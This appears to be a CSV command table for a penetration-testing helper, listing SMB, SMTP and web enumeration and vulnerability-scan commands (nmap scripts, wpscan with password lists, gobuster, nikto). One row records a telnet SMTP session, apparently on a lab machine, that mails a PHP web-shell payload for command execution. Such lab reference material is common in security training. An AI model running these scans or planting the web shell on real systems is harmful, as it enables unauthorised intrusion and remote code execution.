Name,Port,Description,Cmd_Name,Cmd_Description,Cmd_Command,Cmd_Comment,SubDisplayOrder
SMB,139445,Server Message Block,Nmap Smb Scan 1,SMB Vuln Scan With Nmap,"nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}",Unverified,2
SMB,139445,Server Message Block,Nmap Smb Scan 2,SMB Vuln Scan With Nmap (Less Specific),"nmap --script smb-vuln* -Pn -p 139,445 {IP}",Unverified,3
SMB,139445,Server Message Block,SMB Version Enum,Use TcpDump to get SMB Version,Modules/SmbVersionEnum {IP} 139,Unverified,4
SMB,139445,Server Message Block,Handy SMB Tool,Tool To Aid in Manual SMB Enumeration,Modules/SquidsSmbTool.py {IP} {Domain_Name},"Unverified
",5
SMTP,25,Simple Mail Transfer Protocol,SMTP User Enum,Enumerate uses with smtp-user-enum,smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP},"Unverified
",2
SMTP,25,Simple Mail Transfer Protocol,Smtp Manual Enumeration Notes,Enumerate SMTP following a step-by-step Guide,"#telnet 10.10.10.7 25
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.
220 beep.localdomain ESMTP Postfix
EHLO coolhandsquid.au
250-beep.localdomain
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-ENHANCEDSTATUSCODES
250-8BITMIME
250 DSN
VRFY asterisk@localhost  
252 2.0.0 asterisk@localhost
mail from:coolhandsquid@step-child.au
250 2.1.0 Ok
rcpt to:asterisk@localhost
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
Subject: You got owned
<?php echo system($_REQUEST['squid']); ?>

.
250 2.0.0 Ok: queued as 84C50D92F8
^C
^]
telnet> quit
",Unverified,3
WebApp,80,Hypertext Transfer Protocol,WPScan,Enumerate WordPress,"wpscan --url http://{IP} --enumerate ap,at,cb,dbe && wpscan --url http://{IP} --enumerate u,tt,t,vp --passwords {Big_Passwordlist} -e ",Unverified,1
WebApp,80,Hypertext Transfer Protocol,Drupal,Drupal Notes,#git clone https://github.com/immunIT/drupwn.git for low hanging fruit and git clone https://github.com/droope/droopescan.git for the deeper shit,Unverified,2
WebApp,80,Hypertext Transfer Protocol,Joomla,Joomla Notes,#joomlavs.rb and joomblah on github are both incredibly handy,Unverified,3
Web,80,Hypertext Transfer Protocol,Quick Web Scan,Nikto and GoBuster on Each Web Port,%nikto -host http://{IP}:{Port} &&&&gobuster dir -w {Small_Dirlist} -u http://{IP}:{Port} && gobuster dir -w {Big_Dirlist} -u http://{IP}:{Port},Script Needs Writen,1
Web,80,Hypertext Transfer Protocol,SQLMap,Tool To Aid in Running SQLMap,Modules/SquidsSqlMapTool.py,Unverified,2
Web,80,Hypertext Transfer Protocol,WFuzz,Tool To Aid in Running WFuzz,Modules/SquidsWfuzzTool.py,Unverified,3
Web,80,Hypertext Transfer Protocol,Nikto,Generic Web Scan,nikto -host http://{IP}:80,Unverified,4
Web,80,Hypertext Transfer Protocol,Directory Brute Force Non-Recursive,Non-Recursive Directory Brute Force,gobuster dir -w {Big_Dirlist} -u http://{IP}:80,Unverified,5
Web,80,Hypertext Transfer Protocol,Directory Brute Force Recursive,Recursive Directory Brute Force,"python3 dirsearch/dirsearch.py -w {Small_Dirlist} -e php,exe,sh,py,html,pl -f -t 20 -u http://{IP}:80 -r -R 10",Unverified,6
Web,80,Hypertext Transfer Protocol,Directory Brute Force CGI,Common Gateway Interface Brute Force,gobuster dir -u http://{IP}:80/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s 200,Unverified,7
Web,80,Hypertext Transfer Protocol,Nmap Web Vuln Scan,Tailored Nmap Scan for web Vulnerabilities,"nmap -vv --reason -Pn -sV -p 80 --script=`banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)` {IP}",Unverified,8
Web,80,Hypertext Transfer Protocol,Nmap ShellShock,Test for ShellShock Vulnerability with custom NSE Script,nmap -vv --reason -Pn -sV -p 80 --script=Modules/http-shellshock.nse {IP},Unverified,9
Web,80,Hypertext Transfer Protocol,Test,Test,%nikto -host http://{IP}:{Port},Unverified,10
SFTP,20,Secure FTP,some command,does a thing,"echo ""yeet cannon""",Unverified,
